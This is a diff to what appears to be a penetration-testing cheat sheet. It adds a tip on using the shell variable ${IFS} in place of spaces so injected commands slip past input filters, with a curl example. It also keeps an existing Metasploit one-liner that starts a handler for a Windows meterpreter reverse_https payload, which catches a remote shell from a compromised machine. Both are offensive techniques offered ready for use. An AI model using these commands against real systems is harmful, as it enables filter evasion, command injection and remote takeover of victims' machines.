@@ -1,3 +1,7 @@
+# Replace Whitespaces in Bash command
+Often whitespaces break the http request, but you can use the variable `${IFS}` instead.
+Example: Instead of `curl http://localhost`, try `curl${IFS}http://localhost`
+
 # msfconsole one-liner
 ```
 sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 10.10.10.10; set LPORT 3141; exploit"
